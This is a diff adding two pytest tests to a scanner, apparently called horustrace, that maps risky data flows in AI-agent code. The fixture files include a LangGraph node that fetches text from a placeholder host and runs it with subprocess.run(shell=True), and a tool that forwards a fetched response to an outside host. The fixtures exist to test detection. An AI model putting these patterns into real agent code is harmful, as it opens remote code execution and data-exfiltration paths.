@@ -89,3 +89,82 @@ def test_cross_file_ambiguous_tool_binding_remains_unmapped(tmp_path: Path) -> N
 
     assert len(flows) == 1
     assert flows[0].agent is None
+
+
+
+def test_frozen_corpus_style_openai_imported_tool_maps_flow(tmp_path: Path) -> None:
+    """Mirrors the imported-tool/source->external-send shape seen in Cohort C."""
+    tools_path = tmp_path / "tools.py"
+    tools_path.write_text(
+        """
+import requests
+
+def forward_external_result():
+    response = requests.get("https://source.example/data")
+    return requests.post("https://sink.example/events", json=response.json())
+""",
+        encoding="utf-8",
+    )
+    (tmp_path / "agent.py").write_text(
+        """
+from agents import Agent
+from tools import forward_external_result
+
+agent = Agent(name="Orchestrator", tools=[forward_external_result])
+""",
+        encoding="utf-8",
+    )
+
+    from horustrace.scanner import scan
+
+    graph, _ = scan(tmp_path)
+    flows = [
+        flow
+        for flow in graph.flow_paths
+        if flow.source_kind == "external_http_response"
+        and flow.sink_kind == "external_send"
+    ]
+
+    assert flows
+    assert {flow.agent for flow in flows} == {"Orchestrator"}
+    tool = next(t for t in graph.agents[0].tools if t.name == "forward_external_result")
+    assert tool.metadata["source_function_key"] == "tools.forward_external_result"
+    assert any(
+        item.origin == "source_binding"
+        and item.fact == "function=tools.forward_external_result"
+        for item in tool.provenance
+    )
+
+
+def test_frozen_corpus_style_langgraph_node_maps_flow(tmp_path: Path) -> None:
+    """Mirrors Cohort C LangGraph source->process execution flow shapes."""
+    (tmp_path / "workflow.py").write_text(
+        """
+import requests
+import subprocess
+from langgraph.graph import StateGraph
+
+def fetch_and_execute(state):
+    response = requests.get("https://source.example/task")
+    subprocess.run(response.text, shell=True)
+
+workflow = StateGraph(dict)
+workflow.add_node("executor", fetch_and_execute)
+""",
+        encoding="utf-8",
+    )
+
+    from horustrace.scanner import scan
+
+    graph, _ = scan(tmp_path)
+    flows = [
+        flow
+        for flow in graph.flow_paths
+        if flow.source_kind == "external_http_response"
+        and flow.sink_kind == "process_execute"
+    ]
+
+    assert len(flows) == 1
+    assert flows[0].agent == "workflow"
+    tool = next(t for t in graph.agents[0].tools if t.name == "executor")
+    assert tool.metadata["source_function_key"] == "workflow.fetch_and_execute"
